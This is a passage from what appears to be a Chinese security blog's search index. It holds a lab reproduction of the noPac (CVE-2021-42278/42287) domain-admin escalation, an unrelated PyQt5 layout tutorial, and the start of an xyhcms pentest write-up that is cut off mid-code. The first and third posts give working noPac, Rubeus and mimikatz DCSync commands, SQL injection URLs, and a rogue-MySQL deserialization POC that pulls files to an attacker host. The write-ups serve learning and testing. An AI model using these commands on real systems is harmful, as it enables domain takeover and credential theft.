href=\"https://mp.weixin.qq.com/s/2YpBKOzJ8w8m51OUN1XJ0A\">https://mp.weixin.qq.com/s/2YpBKOzJ8w8m51OUN1XJ0A</a></p>\n","categories":["漏洞复现"],"tags":["漏洞复现","模板注入"]},{"title":"Windows域服务权限提升（CVE-2021-42287）","url":"/2022/04/07/Windows%E5%9F%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88CVE-2021-42287%EF%BC%89/","content":"<h1 id=\"Windows域服务权限提升（CVE-2021-42287）\"><a href=\"#Windows域服务权限提升（CVE-2021-42287）\" class=\"headerlink\" title=\"Windows域服务权限提升（CVE-2021-42287）\"></a>Windows域服务权限提升（CVE-2021-42287）</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Microsoft Windows Active Directory 域服务权限提升漏洞（CVE-2021-42278、CVE-2021-42287）攻击者可利用该漏洞将域内的普通用户权限提升到域管理员权限，造成风险和危害极大。</p>\n<h2 id=\"靶场环境：\"><a href=\"#靶场环境：\" class=\"headerlink\" title=\"靶场环境：\"></a>靶场环境：</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">域：fbi.gov</span><br><span class=\"line\">域控：dc.fbi.gov</span><br><span class=\"line\">普通域用户：fbi\\fileserver</span><br></pre></td></tr></table></figure>\n<p>影响范围</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">CVE-2021-42278</span><br><span class=\"line\">￮ Windows Server 2012 R2</span><br><span class=\"line\">￮ Windows Server 2012 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2012</span><br><span class=\"line\">￮ Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class=\"line\">￮ Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class=\"line\">￮ Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class=\"line\">￮ Windows Server 2016 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2016</span><br><span class=\"line\">￮ Windows Server, version 20H2 (Server Core Installation)</span><br><span class=\"line\">￮ Windows Server, version 2004 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2022 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2019 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2022￮ Windows Server 2019</span><br><span class=\"line\">￮ Windows Server 2012 R2 (Server Core installation)</span><br></pre></td></tr></table></figure>\n<h2 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）一个普通域成员帐户。</span><br><span class=\"line\">（2）域用户有创建机器用户的权限（一般默认权限）。</span><br><span class=\"line\">（3）DC未打补丁KB5008380或KB5008602。</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"直接利用一（noPac-py）\"><a href=\"#直接利用一（noPac-py）\" class=\"headerlink\" title=\"直接利用一（noPac.py）\"></a>直接利用一（noPac.py）</h2><p><a href=\"https://github.com/cube0x0/noPac\">https://github.com/cube0x0/noPac</a></p>\n<p>扫描探测（noPac.py）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\noPac.exe scan -domain fbi.gov -user fileserver -pass <span class=\"string\">&#x27;QWEasd1234&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>直接利用（noPac.py）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\noPac.exe -domain fbi.gov -user fileserver -pass <span class=\"string\">&#x27;QWEasd1234&#x27;</span> /dc dc.fbi.gov /mAccount garck /mPassword pass123 /service cifs /ptt</span><br></pre></td></tr></table></figure>\n<p><img src=\"0.8681485612867944.png\" alt=\"image\"></p>\n<p>若用户存在的话，则会显示对象已经存在</p>\n<p><img src=\"62c1fb32-ebb9-4bac-9b4c-a219d2344728.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> //dc.fbi.gov/c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"0.8251252992718687.png\" alt=\"image\"></p>\n<p>当服务器xxx时，再攻击DC域控的时候会出现下面的情况</p>\n<p><img src=\"1c7b83a0-48c1-438c-a207-65615554f6d0.png\" alt=\"image\"></p>\n<h2 id=\"直接利用二（sam-the-admin-py）\"><a href=\"#直接利用二（sam-the-admin-py）\" class=\"headerlink\" title=\"直接利用二（sam_the_admin.py）\"></a>直接利用二（sam_the_admin.py）</h2><p><strong>注意⚠️：从域外环境已知域内一个普通用户密码直接拿DC shell或者域内所有hash（IP为访问到）。</strong></p>\n<p><a href=\"https://github.com/WazeHell/sam-the-admin\">https://github.com/WazeHell/sam-the-admin</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 sam_the_admin.py fbi.gov/fileserver:<span class=\"string\">&#x27;QWEasd1234&#x27;</span> -dc-ip 192.168.8.11 -shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"b24fd0cb-ce22-4f8c-9580-fe5dd14907e6.png\" alt=\"image\"></p>\n<p>当服务器xxx时，再攻击DC域控的时候会出现下面的情况</p>\n<p><img src=\"4c59e895-9183-4fb5-a7b9-2d240765b4c8.png\" alt=\"image\"></p>\n<h2 id=\"本地复现\"><a href=\"#本地复现\" class=\"headerlink\" title=\"本地复现\"></a>本地复现</h2><h3 id=\"1、普通域成员账户\"><a href=\"#1、普通域成员账户\" class=\"headerlink\" title=\"1、普通域成员账户\"></a>1、普通域成员账户</h3><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">net user fileserver /domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"5d95aa78-e29c-4780-b250-1e630bc93989.png\" alt=\"image\"></p>\n<h3 id=\"2、利用-powermad-ps1-新增机器帐号testspn（域用户默认可以新建机器账户）\"><a href=\"#2、利用-powermad-ps1-新增机器帐号testspn（域用户默认可以新建机器账户）\" class=\"headerlink\" title=\"2、利用 powermad.ps1 新增机器帐号testspn（域用户默认可以新建机器账户）\"></a>2、利用 powermad.ps1 新增机器帐号testspn（域用户默认可以新建机器账户）</h3><p>下载地址：<a href=\"https://github.com/Kevin-Robertson/Powermad\">https://github.com/Kevin-Robertson/Powermad</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Powermad.ps1</span><br><span class=\"line\">//若报错执行 Set-ExecutionPolicy Unrestricted</span><br><span class=\"line\">New-MachineAccount -MachineAccount testspn -Domain fbi.gov -DomainController dc.fbi.gov -Verbose</span><br><span class=\"line\">//密码输入123.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"b0f5c505-c050-485c-ae6e-aca22dc7caf6.png\" alt=\"image\"></p>\n<h3 id=\"3、Clear-its-SPNs（利用PowerView清除SPN信息）\"><a href=\"#3、Clear-its-SPNs（利用PowerView清除SPN信息）\" class=\"headerlink\" title=\"3、Clear its SPNs（利用PowerView清除SPN信息）\"></a>3、Clear its SPNs（利用PowerView清除SPN信息）</h3><p>更改执行策略，以管理员身份打开 PowerShell 输入：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; set-executionpolicy remotesigned</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">如果要更改回Windows 客户端计算机的默认执行策略，则设置为restricted：set-executionpolicy restricted</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">//需要ps1版本impact套件</span><br><span class=\"line\">Import-Module .\\PowerView.ps1</span><br><span class=\"line\">Set-DomainObject <span class=\"string\">&quot;CN=testspn,CN=Computers,DC=fbi,DC=gov&quot;</span> -Clear <span class=\"string\">&#x27;serviceprincipalname&#x27;</span> -Verbose</span><br></pre></td></tr></table></figure>\n<p><img src=\"4dc5ad32-e97f-48ca-94c8-3dd0e1bdbe96.png\" alt=\"image\"></p>\n<h3 id=\"4、Reset-the-computer-name（利用Powermad重设机器名称）\"><a href=\"#4、Reset-the-computer-name（利用Powermad重设机器名称）\" class=\"headerlink\" title=\"4、Reset the computer name（利用Powermad重设机器名称）\"></a>4、Reset the computer name（利用Powermad重设机器名称）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-MachineAccountAttribute -MachineAccount testspn -Value <span class=\"string\">&quot;dc&quot;</span> -Attribute samaccountname -Verbose</span><br><span class=\"line\">//由于当前DC SPN账户为dc$，故要设置为dc进行伪造</span><br></pre></td></tr></table></figure>\n<p><img src=\"564a7c07-f22d-498a-b59a-c9836ba03760.png\" alt=\"image\"></p>\n<h3 id=\"5、Request-TGT-（请求TGT）\"><a href=\"#5、Request-TGT-（请求TGT）\" class=\"headerlink\" title=\"5、Request TGT （请求TGT）\"></a>5、Request TGT （请求TGT）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\Rubeus.exe asktgt /user:dc /password:123.com /domian:fbi.gov /dc:dc.fbi.gov /nowrap</span><br><span class=\"line\">.\\Rubeus.exe asktgt /user:administrator /password:123.com /domian:fbi.gov /dc:dc.fbi.gov /nowrap</span><br></pre></td></tr></table></figure>\n<p><img src=\"d4f1a458-e3d8-478c-9d83-46fc845961a9.png\" alt=\"image\"></p>\n<h3 id=\"6、Change-Machine-Account-samaccountname（还原初始账户属性）\"><a href=\"#6、Change-Machine-Account-samaccountname（还原初始账户属性）\" class=\"headerlink\" title=\"6、Change Machine Account samaccountname（还原初始账户属性）\"></a>6、Change Machine Account samaccountname（还原初始账户属性）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">//重新还原机器帐户属性后，现在就可以使用能检索到的TGT请求S4U2self票证来获得使用DC密钥加密的ST，同时还可以将票证中的sname重写为LDAP服务</span><br><span class=\"line\">Set-MachineAccountAttribute -MachineAccount testspn -Value <span class=\"string\">&quot;testspn&quot;</span> -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>\n<p><img src=\"6e958824-068b-45b5-9985-6c3fcd6b299b.png\" alt=\"image\"></p>\n<h3 id=\"7、Request-S4U2self（获取票据）\"><a href=\"#7、Request-S4U2self（获取票据）\" class=\"headerlink\" title=\"7、Request S4U2self（获取票据）\"></a>7、Request S4U2self（获取票据）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:dc.fbi.gov /self /altservice:LDAP/dc.fbi.gov /ptt /ticket:doIEeDCCBHSgAwIBBaEDAgEWooIDojCCA55hggOaMIIDlqADAgEFoQkbB0ZCSS5HT1aiHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2ZiaS5nb3ajggNkMIIDYKADAgESoQMCAQKiggNSBIIDTrthGAetrVBk/8RvLbf8KpocXuH9ewn4Cr3y1yM/SGY9QvfoS5TKeRBCraXNHZZxnAumMZ3zM8smSeA35epcmXPJaVSPTKYCQoI5f5dwXQUAgFEtzeqreVLkUJKg2rXB0mi4pzSEbOa+y8t3EJLVE+p42gzKG6FaI31OnBEqKOUfM0U8LECZVDsZlD9GMn/Atf/jYQovWtcW+NWFJDh/dw6pxCRDUDmCmpCH538Tz9QTB2S8PhHnZqjrzLtnIeXE7eRAg49ruoHKAV6rdrfl5HD2rziAadBKDQ1H2eLne8AtuBo+I1GGlnZoIEty7TnITtXDlPll+O5Qes+e3gkI1omlhJAKTw2rOgQzlQwavp8FCu/Z4LMZ6M85/sD4lg5azJqp/w9VwnPZ1jCYx/CU0/vfQDci5ePx4h2yYo2o6ID21q8Wrg53rfMXvl+MYrrhH5lHxo4Uv5J6wkURiZZLx8rokSU2gCBuFaYe6iOyHUQIpC1XGlSwy9V/5MHbukibBH+ixhnP/ATprJiPSj6CaPpGgdllbWl0YyexFTg96CaLIRV1uBAlm266RDxxUHEBOsWZZIsDnw0B4dUTlhgKB4j5MY9y/aEoWb8mdvpsVDgA1GN5uZyfXyctvNSKfkyMNB2kZySj6esAW6L5n2pcAMnAIqZEQfP2zO5t8eRQOP4Yl7CdMRDPA5bbjdZp6wYLKgBYzKdxQyAbjkbQIWVVB15zQkc1Yc9POZPVlfxPF9JwJKq21jPf7QvXs3n1ebaQbputQIMpsEnywcEAzgW7Oy4uejdn3zi4fET57RXXBFOaqxLKf4KDPyqip5GDGtVJqGDK/vUO5zSin7v5mEWF7kinucZlgTSg5iMzgSdGC//joD9xElA65f/iQCIeOOUl+iDFs/tf8EQZvEQKbp88LI6KcDqYvJ3Ge1rvFIQwhGxsLWsAAutkFMn111nyKBTmqi/+OllYPbZhkHRglUBB80SXK85BUhL3a3O3JR3tHlHTz+A0DOUloiYDVn4qhx76rPFSkhdnH9ZdxX9I/PAkJDYnGubfoMo+/5OhcQG1WWQP8XkjwllcOKTmf1HTOLXUtXFkpos8F/84+Z+g9mKzk3QlcCzRfLQ8j+ntOeGGWqOBwTCBvqADAgEAooG2BIGzfYGwMIGtoIGqMIGnMIGkoBswGaADAgEXoRIEEIZs7uBBRhm/zUWKNCQGYYChCRsHRkJJLkdPVqIPMA2gAwIBAaEGMAQbAmRjowcDBQBA4QAApREYDzIwMjIwNDA2MTU0MzQwWqYRGA8yMDIyMDQwNzAxNDM0MFqnERgPMjAyMjA0MTMxNTQzNDBaqAkbB0ZCSS5HT1apHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2ZiaS5nb3Y==</span><br></pre></td></tr></table></figure>\n<p><img src=\"76ffa80f-2b6c-4df9-a93d-ad5c0be5edd1.png\" alt=\"image\"></p>\n<p><img src=\"da74ce78-3d65-405f-aa5b-34202c5125f6.png\" alt=\"image\"></p>\n<h3 id=\"8、获取-kbrtgt-用户的-NTLM-Hash\"><a href=\"#8、获取-kbrtgt-用户的-NTLM-Hash\" class=\"headerlink\" title=\"8、获取 kbrtgt 用户的 NTLM Hash\"></a>8、获取 kbrtgt 用户的 NTLM Hash</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz.exe</span><br><span class=\"line\">lsadump::dcsync /domain:fbi.gov /user:krbtgt</span><br><span class=\"line\">//一句话输出</span><br><span class=\"line\">mimikatz.exe <span class=\"string\">&quot;lsadump::dcsync /domain:fbi.gov /user:krbtgt&quot;</span> <span class=\"built_in\">exit</span> &gt;dcsync.txt</span><br></pre></td></tr></table></figure>\n","categories":["漏洞复现"],"tags":["漏洞复现","域控","权限提升"]},{"title":"pyqt5实现列表的按钮切换页面","url":"/2022/11/10/pyqt5%E5%AE%9E%E7%8E%B0%E5%88%97%E8%A1%A8%E7%9A%84%E6%8C%89%E9%92%AE%E5%88%87%E6%8D%A2%E9%A1%B5%E9%9D%A2/","content":"<h1 id=\"pyqt5实现列表的按钮切换页面\"><a href=\"#pyqt5实现列表的按钮切换页面\" class=\"headerlink\" title=\"pyqt5实现列表的按钮切换页面\"></a>pyqt5实现列表的按钮切换页面</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5 <span class=\"keyword\">import</span> QtCore, QtGui, QtWidgets</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5.QtCore <span class=\"keyword\">import</span> Qt</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5.QtGui <span class=\"keyword\">import</span> QIcon</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5.QtWidgets <span class=\"keyword\">import</span> (QApplication, QMainWindow, QStackedLayout, QWidget,</span><br><span class=\"line\">                             QToolBar, QToolButton, QStyle, QColorDialog, QFontDialog,</span><br><span class=\"line\">                             QVBoxLayout, QGroupBox, QRadioButton)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DemoStackedLayout</span>(<span class=\"title class_ inherited__\">QMainWindow</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, parent=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(DemoStackedLayout, self).__init__(parent)</span><br><span class=\"line\">        <span class=\"comment\"># 设置窗口标题</span></span><br><span class=\"line\">        self.setWindowTitle(<span class=\"string\">&#x27;实战PyQt5: QStackedLayout Demo!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 设置窗口大小</span></span><br><span class=\"line\">        <span class=\"comment\">#self.resize(480, 360)</span></span><br><span class=\"line\">        self.resize(<span class=\"number\">480</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\">        self.initUi()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">initUi</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        toolBar = QToolBar(self)</span><br><span class=\"line\">        self.addToolBar(Qt.LeftToolBarArea, toolBar)</span><br><span class=\"line\"></span><br><span class=\"line\">        btnColor = self.createButton(<span class=\"string\">&#x27;颜色对话框&#x27;</span>)</span><br><span class=\"line\">        btnColor.clicked.connect(<span class=\"keyword\">lambda</span>: self.onButtonClicked(<span class=\"number\">0</span>))</span><br><span class=\"line\">        toolBar.addWidget(btnColor)</span><br><span class=\"line\">        btnFont = self.createButton(<span class=\"string\">&#x27;字体对话框&#x27;</span>)</span><br><span class=\"line\">        btnFont.clicked.connect(<span class=\"keyword\">lambda</span>: self.onButtonClicked(<span class=\"number\">1</span>))</span><br><span class=\"line\">        toolBar.addWidget(btnFont)</span><br><span class=\"line\">        btnUser = self.createButton(<span class=\"string\">&#x27; 分组部件&#x27;</span>)</span><br><span class=\"line\">        btnUser.clicked.connect(<span class=\"keyword\">lambda</span>: self.onButtonClicked(<span class=\"number\">2</span>))</span><br><span class=\"line\">        toolBar.addWidget(btnUser)</span><br><span class=\"line\"></span><br><span class=\"line\">        mainWidget = QWidget(self)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.mainLayout = QStackedLayout(mainWidget)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 添加三个widget,演示三个页面之间的切换</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 颜色对话框</span></span><br><span class=\"line\">        self.mainLayout.addWidget(QColorDialog(self))</span><br><span class=\"line\">        <span class=\"comment\"># 字体对话框</span></span><br><span class=\"line\">        self.mainLayout.addWidget(QFontDialog(self))</span><br><span class=\"line\">        <span class=\"comment\"># 自定义控件</span></span><br><span class=\"line\">        self.mainLayout.addWidget(self.createExclusiveGroup())</span><br><span class=\"line\"></span><br><span class=\"line\">        mainWidget.setLayout(self.mainLayout)</span><br><span class=\"line\">        <span class=\"comment\"># 设置中心窗口</span></span><br><span class=\"line\">        self.setCentralWidget(mainWidget)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">createButton</span>(<span class=\"params\">self, text</span>):</span><br><span class=\"line\">        icon = QApplication.style().standardIcon(QStyle.SP_DesktopIcon)</span><br><span class=\"line\">        btn = QToolButton(self)</span><br><span class=\"line\">        btn.setText(text)</span><br><span class=\"line\">        btn.setIcon(icon)</span><br><span class=\"line\">        btn.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> btn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">onButtonClicked</span>(<span class=\"params\">self, index</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> index &lt; self.mainLayout.count():</span><br><span class=\"line\">            self.mainLayout.setCurrentIndex(index)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> index ==<span class=\"number\">0</span>:</span><br><span class=\"line\">                self.resize(<span class=\"number\">580</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> index ==<span class=\"number\">1</span>:</span><br><span class=\"line\">                self.resize(<span class=\"number\">680</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> index ==<span class=\"number\">2</span>:</span><br><span class=\"line\">                self.resize(<span class=\"number\">780</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">createExclusiveGroup</span>(<span class=\"params\">self</span>):<span class=\"comment\">#QTabWidget</span></span><br><span class=\"line\">        groupBox = QGroupBox(<span class=\"string\">&#x27;Exclusive Radio Buttons&#x27;</span>, self)</span><br><span class=\"line\">        radio1 = QRadioButton(<span class=\"string\">&#x27;&amp;Radio Button 1&#x27;</span>, self)</span><br><span class=\"line\">        radio1.setChecked(<span class=\"literal\">True</span>)</span><br><span class=\"line\">        radio2 = QRadioButton(<span class=\"string\">&#x27;R&amp;adio button 2&#x27;</span>, self)</span><br><span class=\"line\">        radio3 = QRadioButton(<span class=\"string\">&#x27;Ra&amp;dio button 3&#x27;</span>, self)</span><br><span class=\"line\"></span><br><span class=\"line\">        vLayout = QVBoxLayout(groupBox)</span><br><span class=\"line\">        vLayout.addWidget(radio1)</span><br><span class=\"line\">        vLayout.addWidget(radio2)</span><br><span class=\"line\">        vLayout.addWidget(radio3)</span><br><span class=\"line\">        vLayout.addStretch(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        groupBox.setLayout(vLayout)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> groupBox</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app = QApplication(sys.argv)</span><br><span class=\"line\">    window = DemoStackedLayout()</span><br><span class=\"line\">    window.show()</span><br><span class=\"line\">    sys.exit(app.<span class=\"built_in\">exec</span>())</span><br></pre></td></tr></table></figure>\n\n\n<p><img src=\"4nAjrgwaN5coGfTS9W-8PyE5OzkSFTrO_R4K3EWnARA.png\" alt=\"image\"></p>\n<p><img src=\"KPWLJP3P2DvQRTFnDRIa-dE67sWHNUbicHLqnzMUHjs.png\" alt=\"image\"></p>\n<p><img src=\"XvBLsXHK2bYFz-T0I8_ZtiUOAAfFEVhMM4BFYCbZXyE.png\" alt=\"image\"></p>\n","categories":["python开发"],"tags":["python","pyqt"]},{"title":"scaner从外网到拿下域控","url":"/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/","content":"<h1 id=\"scaner从外网到拿下域控\"><a href=\"#scaner从外网到拿下域控\" class=\"headerlink\" title=\"scaner从外网到拿下域控\"></a>scaner从外网到拿下域控</h1><h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>这是个人moonsec考核的出师文章</p>\n<h1 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h1><h2 id=\"目录扫描\"><a href=\"#目录扫描\" class=\"headerlink\" title=\"目录扫描\"></a>目录扫描</h2><p>打开了站点很明显发现了这是个xyhcms，先使用御剑扫一波目录，未发现敏感信息。</p>\n<h2 id=\"漏洞整理\"><a href=\"#漏洞整理\" class=\"headerlink\" title=\"漏洞整理\"></a>漏洞整理</h2><p>从网上查找该cms的一些相关的漏洞，找到了一个前台SQL注入和一些后台getshell,以及反序列化漏洞。</p>\n<p>前台SQL注入：<a href=\"http://althims.com/2020/02/03/xyhcms-3-6/\">http://althims.com/2020/02/03/xyhcms-3-6/</a></p>\n<p>后台getshell：<a href=\"https://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/\">https://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</a></p>\n<p>反序列化：<a href=\"https://www.anquanke.com/post/id/232823\">https://www.anquanke.com/post/id/232823</a></p>\n<h2 id=\"在本地搭建xyhcms进行测试\"><a href=\"#在本地搭建xyhcms进行测试\" class=\"headerlink\" title=\"在本地搭建xyhcms进行测试\"></a>在本地搭建xyhcms进行测试</h2><p>搭建使用的是phpstudy集成工具</p>\n<h3 id=\"前台SQL注入\"><a href=\"#前台SQL注入\" class=\"headerlink\" title=\"前台SQL注入\"></a>前台SQL注入</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//xyh.com/index.php/Api/Lt/alist</span></span><br><span class=\"line\">?orderby[<span class=\"title function_ invoke__\">updatexml</span>(<span class=\"number\">1</span>,<span class=\"title function_ invoke__\">concat</span>(<span class=\"title function_ invoke__\">char</span>(<span class=\"number\">126</span>),(select <span class=\"title function_ invoke__\">database</span>()),<span class=\"title function_ invoke__\">char</span>(<span class=\"number\">126</span>)),<span class=\"number\">1</span>);]=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"eFiDj6ZnDA-I7w_D_zmx58BYFtwNVMRLVWolNtJ3uYw.png\" alt=\"image\"></p>\n<p>通过日志查看结果：成功执行user()</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//xyh.com/App/Runtime/Logs/Api/22_05_14.log</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"2AhTENzE3OvrZY3JEuQOID-q9LWDkoRzgIrqLeBQ3go.png\" alt=\"image\"></p>\n<h3 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h3><p>查看前面看到的反序列化文章，这个反序列化漏洞，事先需要拿到key，在本地导出了SQL文件能查询到这个key，说明该key是存在于数据库中的，可以结合前面的SQL注入拿到。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//xyh.com/index.php/Api/Lt/alist?orderby[updatexml(1,concat(char(126),(select username from xyh_admin limit 0,1),char(126)),1);]=1</span></span><br></pre></td></tr></table></figure>\n<p>然后通过查看日志拿到key：iqQmhxkAU</p>\n<p>注册一个会员</p>\n<p><img src=\"0434TErovOItsmPmfHF-sxPxo-gWTuZ-6ula6ewoftY.png\" alt=\"image\"></p>\n<p>登录之后抓包</p>\n<p><img src=\"vqMPR-A3881I2hhT0u2Zg9yxN5SL47Q67Mfdx5-xCxM.png\" alt=\"image\"></p>\n<p>伪造nickname的值可以操作数据库</p>\n<h3 id=\"恶意MySQL服务器读取数据库文件\"><a href=\"#恶意MySQL服务器读取数据库文件\" class=\"headerlink\" title=\"恶意MySQL服务器读取数据库文件\"></a>恶意MySQL服务器读取数据库文件</h3><p>让系统报错，拿到绝对路径：</p>\n<p>xyh.com&#x2F;App&#x2F;Api&#x2F;Conf&#x2F;config.php</p>\n<p>绝对路径：</p>\n<p><strong>C:\\phpstudy_pro\\WWW\\xyh.com\\App\\Api\\Conf\\config.php</strong></p>\n<p><img src=\"KaMc7sJAAqq0hupbC3YG5-qMTqkJyWdGpjGxIFPvVVc.png\" alt=\"image\"></p>\n<p>数据库配置文件的默认路径：xyhcms\\\\App\\\\Common\\\\Conf\\\\db.php</p>\n<p>构建的地址为：C:\\\\phpstudy_pro\\\\WWW\\\\xyh.com\\\\App\\\\Common\\\\Conf\\\\db.php</p>\n<p>启动MySQL服务：</p>\n<p><code>python rogue_mysql_server.py</code></p>\n<p>设置POC：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title class_\">Think</span>\\<span class=\"title class_\">Db</span>\\<span class=\"title class_\">Driver</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">PDO</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Mysql</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$options</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        PDO::<span class=\"variable constant_\">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;dsn&quot;</span>    =&gt; <span class=\"string\">&quot;mysql:host=192.168.8.133;dbname=xyhcms;port=3306&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;username&quot;</span> =&gt; <span class=\"string\">&quot;root&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;password&quot;</span> =&gt; <span class=\"string\">&quot;123456&quot;</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title 